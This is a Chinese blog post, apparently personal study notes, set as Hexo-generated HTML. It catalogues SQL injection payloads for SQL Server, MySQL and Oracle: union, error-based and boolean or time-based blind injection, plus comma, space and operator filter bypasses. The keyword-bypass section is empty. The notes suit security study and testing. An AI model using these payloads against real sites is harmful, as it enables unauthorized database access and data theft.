@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <title>sql注入 | Hexo</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="白帽子，咸鱼">
+  
+
+  <meta name="description" content="SQLsql注入可以分为联合查询，报错注入，bool盲注，时间盲注 sql server联合查询and 1=1、order by 之类的判断存在和字段数。 这里sqlserver使用联合查询时最好用select null而不是select 1 sqlsever支持多语句形式，select 1;select  2;能执行成功。 报错注入1=convert(int,(select @@version)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入">
+<meta property="og:url" content="http://yoursite.com/2020/04/05/sql注入/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="SQLsql注入可以分为联合查询，报错注入，bool盲注，时间盲注 sql server联合查询and 1=1、order by 之类的判断存在和字段数。 这里sqlserver使用联合查询时最好用select null而不是select 1 sqlsever支持多语句形式，select 1;select  2;能执行成功。 报错注入1=convert(int,(select @@version)">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2020-04-05T09:28:57.526Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sql注入">
+<meta name="twitter:description" content="SQLsql注入可以分为联合查询，报错注入，bool盲注，时间盲注 sql server联合查询and 1=1、order by 之类的判断存在和字段数。 这里sqlserver使用联合查询时最好用select null而不是select 1 sqlsever支持多语句形式，select 1;select  2;能执行成功。 报错注入1=convert(int,(select @@version)">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbeddx" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-38189205-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+
+</head>
+</html>
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tags/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/atom.xml"
+            rel="noopener noreferrer"
+            target="_blank"
+            >
+            RSS
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">Posts List</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL"><span class="toc-text">SQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql-server"><span class="toc-text">sql server</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#联合查询"><span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报错注入"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#盲注"><span class="toc-text">盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MYSQL"><span class="toc-text">MYSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#联合查询-1"><span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报错注入-1"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#盲注-1"><span class="toc-text">盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle"><span class="toc-text">Oracle</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#联合查询-2"><span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报错注入-2"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#盲注-2"><span class="toc-text">盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#根据位置不同的注入"><span class="toc-text">根据位置不同的注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#a"><span class="toc-text">$a</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#b-c-d-as-ad-e"><span class="toc-text">$b,$c,$d,$as,$ad,$e</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#f"><span class="toc-text">$f</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#绕过"><span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#符号绕过"><span class="toc-text">符号绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#逗号"><span class="toc-text">逗号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#等号-大小于号"><span class="toc-text">等号,大小于号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#空格"><span class="toc-text">空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关键字绕过"><span class="toc-text">关键字绕过</span></a></li></ol></li></ol></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-sql注入" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">sql注入</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2020.04.05</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>John Doe</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/渗透/">渗透</a>
+  </span>
+
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p>sql注入可以分为联合查询，报错注入，bool盲注，时间盲注</p>
+<h2 id="sql-server"><a href="#sql-server" class="headerlink" title="sql server"></a>sql server</h2><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>and 1=1、order by 之类的判断存在和字段数。</p>
+<p>这里sqlserver使用联合查询时最好用select null而不是select 1</p>
+<p>sqlsever支持多语句形式，select 1;select  2;能执行成功。</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>1=convert(int,(select @@version))</p>
+<p>and (SELECT top 1 Name FROM Master..SysDatabases)&gt;0</p>
+<p>sqlserver报错就是利用类型转换的错误来造成错误报错</p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>and 4=length(database());判断长度</p>
+<p>and ‘i’=mid(database(),start,len),start开始位置，len返回字符数.substr使用方法一样</p>
+<p>and ascii(substr(database(),1,1))&gt;1转换为ascii码来判断</p>
+<p>if(SUBSTRING(DB_NAME(),1,1)=’m’) waitfor delay ‘0:0:1’时间盲注就加上if来判断，为真则等待5秒,delay后面是时间。</p>
+<p>case SUBSTRING(DB_NAME(),1,1)  when ‘m’ then waitfor delay ‘0:0:5’ ELSE ‘其他’ END//模拟器环境我没执行成功，网上没找到语句。</p>
+<p>盲注中bool盲注可以直接通过页面显示,时间盲注多加个if来判断。</p>
+<h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><h3 id="联合查询-1"><a href="#联合查询-1" class="headerlink" title="联合查询"></a>联合查询</h3><p>同sqlserver，但不支持多语句</p>
+<h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><p>mysql只能用报错函数</p>
+<p>updatexml(1,concat(0x7c,(select user())),1)</p>
+<p>extractvalue(1,concat(0x7c,(select user())))</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(0x3a,0x3a,user(),0x3a,0x3a,floor(rand(0)*2))name from information_schema.tables group by name;</span><br></pre></td></tr></table></figure>
+
+<h3 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h3><p>and 4=length(database());判断长度</p>
+<p>and ‘i’=mid(database(),start,len),start开始位置，len返回字符数.substr使用方法一样</p>
+<p>and ascii(substr(database(),1,1))&gt;1转换为ascii码来判断</p>
+<p>if(4=length(database()),sleep(5),1)时间盲注就加上if来判断，为真则等待5秒,delay后面是时间。</p>
+<h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><h3 id="联合查询-2"><a href="#联合查询-2" class="headerlink" title="联合查询"></a>联合查询</h3><p>select null,null,null from dual oracle在不知道从哪个表查询时必须使用虚拟表dual。</p>
+<h3 id="报错注入-2"><a href="#报错注入-2" class="headerlink" title="报错注入"></a>报错注入</h3><p>and 1=ctxsys.drithsx.sn(1,(select user from dual where rownum=1 ))</p>
+<p>and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null</p>
+<p>oracle报错函数很多，这里不一一列举</p>
+<h3 id="盲注-2"><a href="#盲注-2" class="headerlink" title="盲注"></a>盲注</h3><p>and 1=(select decode(user,’sys’,1,0) from dual) user是否为sys,是1否0</p>
+<p>and 1=(instr((select user from dual),’U’)) instr返回U在user中的位置</p>
+<p>1=(select decode(substr(user,1,1),’S’,(select count(*) from all_objects),0) from dual) 时间盲注//模拟器不能实现，oracle手工搭太麻烦了，没有验证应该问题不大</p>
+<h2 id="根据位置不同的注入"><a href="#根据位置不同的注入" class="headerlink" title="根据位置不同的注入"></a>根据位置不同的注入</h2><p>select $a from $b where $c=$d and $as like ‘%$ad’ order by $e  limit $f;</p>
+<p>一条sql语句大概有以上$标记的注入点</p>
+<h3 id="a"><a href="#a" class="headerlink" title="$a"></a>$a</h3><p>这个位置可以直接select a,(select 1) from test这种查询，跟联合查询一样可以把结果显示出来。</p>
+<h3 id="b-c-d-as-ad-e"><a href="#b-c-d-as-ad-e" class="headerlink" title="$b,$c,$d,$as,$ad,$e"></a>$b,$c,$d,$as,$ad,$e</h3><p>这几个都是将语句拼接为正常语句来利用上面的报错，盲注，联合来执行</p>
+<h3 id="f"><a href="#f" class="headerlink" title="$f"></a>$f</h3><p>limit注入没有order by可以用联合查询</p>
+<p>5&lt;mysql&lt;5.6.6</p>
+<p>procedure analyse(extractvalue(,concat(0x3a,version())),1);BOOL盲注</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(if(mid(version(),1,1) like 5,BENCHMARK(5000000,SHA1(1)),1))))),1)//时间盲注</span><br></pre></td></tr></table></figure>
+
+<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="符号绕过"><a href="#符号绕过" class="headerlink" title="符号绕过"></a>符号绕过</h2><p>上面的总结也看到了sql中常见的符号有逗号，空格，括号，等号。</p>
+<h3 id="逗号"><a href="#逗号" class="headerlink" title="逗号"></a>逗号</h3><p>逗号在sql中使用频率很高</p>
+<p><strong>联合查询</strong></p>
+<p>union select * from ((select 1)a JOIN (select 2)b JOIN (select 3)c)%23</p>
+<p><strong>盲注</strong></p>
+<p>ascii(substr(database() from 1 for 1)) &gt; 120</p>
+<p>select case when substring((select user()) from 1 for 1)=’r’ then sleep(5) else 1 end;</p>
+<h3 id="等号-大小于号"><a href="#等号-大小于号" class="headerlink" title="等号,大小于号"></a>等号,大小于号</h3><p><strong>like</strong></p>
+<p>if((length(database()) like 4),sleep(5),1)</p>
+<p><strong>greatest</strong>返回最大的那个参数</p>
+<p>greatest(substr((select user()),1,1),95)</p>
+<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/**/ %20 %09 %0a</span><br></pre></td></tr></table></figure>
+
+<p><strong>括号来绕过</strong></p>
+<p>select(id)from(fuel_users)union(select(2))</p>
+<p>mysql中所有有结果的语句都可以视为子查询用括号包括起来</p>
+<p>and(if(4=length(database()),sleep(5),1))</p>
+<h3 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h3>
+    
+  </div>
+
+</article>
+
+
+   
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2020/03/24/信息收集/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">Close</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tags/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/atom.xml"
+              rel="noopener noreferrer"
+              target="_blank"
+              >
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
